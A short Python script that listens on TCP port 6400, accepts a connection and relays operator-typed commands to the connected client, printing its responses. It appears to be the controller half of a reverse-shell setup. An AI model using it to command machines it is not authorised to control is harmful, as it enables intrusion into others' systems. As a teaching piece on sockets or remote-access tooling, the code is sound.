import socket
import sys

#Creating Socket
def create_socket():
    try:

        global host
        global port
        global s
        s = socket.socket()
        host = ''
        port = 6400
    
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

#Binding Socket and listening to connections
def bind_socket():

    try:
        global host
        global port
        global s
        
        print("Binding the port " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Failed in binding the port with" + str(msg) + "\n" + "Retrying...")
        bind_socket()

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established" + "IP: " + address[0] + " Port: " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit()':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()